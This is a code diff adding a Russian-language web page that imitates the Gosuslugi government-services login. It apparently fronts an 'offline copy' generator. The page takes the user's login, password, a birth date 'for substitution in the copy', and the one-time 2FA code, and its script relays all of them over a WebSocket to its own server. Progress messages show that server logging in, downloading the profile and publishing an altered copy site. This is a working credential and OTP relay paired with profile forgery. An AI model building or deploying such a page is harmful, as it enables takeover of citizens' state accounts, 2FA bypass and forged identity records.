@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Авторизация Госуслуги — Офлайн Копия</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #0d5ab9;
+            --primary-hover: #0a4693;
+            --bg-color: #f4f6fa;
+            --card-bg: #ffffff;
+            --text-color: #1c2b3e;
+            --text-muted: #6c7c93;
+            --border-color: #d1d9e2;
+            --error-color: #e03e3e;
+            --success-color: #2e7d32;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .auth-container {
+            width: 100%;
+            max-width: 440px;
+            background-color: var(--card-bg);
+            border-radius: 16px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+            padding: 40px 32px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .logo {
+            margin-bottom: 24px;
+            font-weight: 700;
+            font-size: 24px;
+            color: var(--primary-color);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .logo svg {
+            width: 32px;
+            height: 32px;
+            fill: currentColor;
+        }
+
+        h2 {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: var(--text-muted);
+            margin-bottom: 32px;
+        }
+
+        .form-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 6px;
+            color: var(--text-color);
+        }
+
+        input {
+            width: 100%;
+            height: 48px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 0 16px;
+            font-size: 15px;
+            font-family: inherit;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        input:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(13, 90, 185, 0.15);
+        }
+
+        .btn {
+            width: 100%;
+            height: 48px;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s, transform 0.1s;
+            margin-top: 12px;
+        }
+
+        .btn:hover {
+            background-color: var(--primary-hover);
+        }
+
+        .btn:active {
+            transform: scale(0.98);
+        }
+
+        .btn:disabled {
+            background-color: var(--border-color);
+            cursor: not-allowed;
+        }
+
+        /* Progress Panel */
+        .status-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px 0;
+        }
+
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid rgba(13, 90, 185, 0.1);
+            border-left-color: var(--primary-color);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 24px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .status-text {
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+
+        .status-desc {
+            font-size: 14px;
+            color: var(--text-muted);
+        }
+
+        /* Error/Success views */
+        .error-message {
+            color: var(--error-color);
+            background-color: rgba(224, 62, 62, 0.08);
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 14px;
+            margin-bottom: 20px;
+            display: none;
+            text-align: left;
+        }
+
+        .success-icon {
+            width: 64px;
+            height: 64px;
+            background-color: rgba(46, 125, 50, 0.1);
+            color: var(--success-color);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            margin-bottom: 20px;
+        }
+
+        /* Forms transitions */
+        .hidden {
+            display: none !important;
+        }
+
+        .security-notice {
+            margin-top: 32px;
+            font-size: 12px;
+            color: var(--text-muted);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+        
+        .security-notice svg {
+            width: 16px;
+            height: 16px;
+            fill: currentColor;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="auth-container">
+        <!-- Logo -->
+        <div class="logo">
+            <svg viewBox="0 0 24 24">
+                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+            </svg>
+            <span>Госуслуги</span>
+        </div>
+
+        <!-- Error box -->
+        <div id="error-box" class="error-message"></div>
+
+        <!-- 1. LOGIN FORM -->
+        <form id="login-form">
+            <h2>Авторизация</h2>
+            <p class="subtitle">Вход для генерации офлайн-копии</p>
+
+            <div class="form-group">
+                <label for="username">Телефон, эл. почта или СНИЛС</label>
+                <input type="text" id="username" placeholder="Введите логин" required>
+            </div>
+
+            <div class="form-group">
+                <label for="password">Пароль</label>
+                <input type="password" id="password" placeholder="Введите пароль" required>
+            </div>
+
+            <div class="form-group">
+                <label for="birthdate">Дата рождения (для подмены в копии)</label>
+                <input type="text" id="birthdate" placeholder="ДД.ММ.ГГГГ" required pattern="\d{2}\.\d{2}\.\d{4}">
+            </div>
+
+            <button type="submit" class="btn">Продолжить</button>
+        </form>
+
+        <!-- 2. OTP FORM -->
+        <form id="otp-form" class="hidden">
+            <h2>Ввод кода подтверждения</h2>
+            <p class="subtitle">Введите код 2FA с СМС или приложения</p>
+
+            <div class="form-group">
+                <label for="otp-code">Код подтверждения</label>
+                <input type="tel" id="otp-code" placeholder="Введите код" required maxlength="8">
+            </div>
+
+            <button type="submit" class="btn">Подтвердить</button>
+        </form>
+
+        <!-- 3. STATUS / LOADING -->
+        <div id="status-panel" class="status-container">
+            <div class="spinner"></div>
+            <div class="status-text" id="status-title">Подготовка...</div>
+            <div class="status-desc" id="status-msg">Запуск сессии генератора</div>
+        </div>
+
+        <!-- 4. SUCCESS PANEL -->
+        <div id="success-panel" class="status-container">
+            <div class="success-icon">✓</div>
+            <h2>Копия создана!</h2>
+            <p class="subtitle">Ваш сайт успешно сгенерирован и размещен.</p>
+            <button class="btn" id="open-site-btn">Открыть сайт</button>
+        </div>
+
+        <!-- Security Badge -->
+        <div class="security-notice">
+            <svg viewBox="0 0 24 24">
+                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 15l-4-4 1.41-1.41L10 13.17l7.59-7.59L19 7l-9 9z"/>
+            </svg>
+            <span>Сессия защищена шифрованием TLS</span>
+        </div>
+    </div>
+
+    <script>
+        const sessionId = window.location.pathname.split('/').pop();
+        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const wsUrl = `${protocol}//${window.location.host}/ws/${sessionId}`;
+        
+        let ws;
+        
+        const loginForm = document.getElementById('login-form');
+        const otpForm = document.getElementById('otp-form');
+        const statusPanel = document.getElementById('status-panel');
+        const successPanel = document.getElementById('success-panel');
+        const errorBox = document.getElementById('error-box');
+        
+        const statusTitle = document.getElementById('status-title');
+        const statusMsg = document.getElementById('status-msg');
+        const openSiteBtn = document.getElementById('open-site-btn');
+
+        function connectWS() {
+            ws = new WebSocket(wsUrl);
+
+            ws.onmessage = (event) => {
+                const data = JSON.parse(event.data);
+                console.log("WS received:", data);
+
+                switch (data.type) {
+                    case "progress":
+                        showPanel(statusPanel);
+                        statusTitle.innerText = getFriendlyStatus(data.status);
+                        statusMsg.innerText = data.message;
+                        break;
+                        
+                    case "otp_request":
+                        showPanel(otpForm);
+                        hideError();
+                        break;
+                        
+                    case "completed":
+                        showPanel(successPanel);
+                        openSiteBtn.onclick = () => {
+                            window.location.href = data.site_url;
+                        };
+                        break;
+                        
+                    case "failed":
+                        showPanel(loginForm);
+                        showError(data.message);
+                        break;
+                }
+            };
+
+            ws.onclose = () => {
+                console.log("WS connection closed.");
+            };
+
+            ws.onerror = (err) => {
+                console.error("WS error:", err);
+                showError("Ошибка подключения к серверу.");
+            };
+        }
+
+        function getFriendlyStatus(status) {
+            const map = {
+                "initializing": "Подготовка",
+                "navigating": "Соединение",
+                "authenticating": "Вход",
+                "submitting_otp": "Проверка 2FA",
+                "authenticated": "Успешный вход",
+                "downloading": "Скачивание файлов",
+                "processing": "Очистка и сборка",
+            };
+            return map[status] || "Загрузка";
+        }
+
+        function showPanel(panel) {
+            loginForm.classList.add('hidden');
+            otpForm.classList.add('hidden');
+            statusPanel.classList.add('hidden');
+            successPanel.classList.add('hidden');
+            
+            panel.classList.remove('hidden');
+            if (panel === statusPanel || panel === successPanel) {
+                panel.style.display = 'flex';
+            } else {
+                panel.style.display = 'block';
+            }
+        }
+
+        function showError(msg) {
+            errorBox.innerText = msg;
+            errorBox.style.display = 'block';
+        }
+
+        function hideError() {
+            errorBox.style.display = 'none';
+        }
+
+        // Submits
+        loginForm.onsubmit = (e) => {
+            e.preventDefault();
+            hideError();
+            
+            const payload = {
+                type: "login",
+                username: document.getElementById('username').value,
+                password: document.getElementById('password').value,
+                birth_date: document.getElementById('birthdate').value
+            };
+            
+            if (!ws || ws.readyState !== WebSocket.OPEN) {
+                connectWS();
+                setTimeout(() => ws.send(JSON.stringify(payload)), 1000);
+            } else {
+                ws.send(JSON.stringify(payload));
+            }
+            
+            showPanel(statusPanel);
+            statusTitle.innerText = "Отправка данных";
+            statusMsg.innerText = "Подключение к Госуслугам...";
+        };
+
+        otpForm.onsubmit = (e) => {
+            e.preventDefault();
+            hideError();
+            
+            const code = document.getElementById('otp-code').value;
+            ws.send(JSON.stringify({
+                type: "otp_submit",
+                code: code
+            }));
+            
+            showPanel(statusPanel);
+            statusTitle.innerText = "Проверка 2FA";
+            statusMsg.innerText = "Отправка одноразового кода...";
+        };
+
+        // Connect WebSocket on load
+        connectWS();
+    </script>
+</body>
+</html>
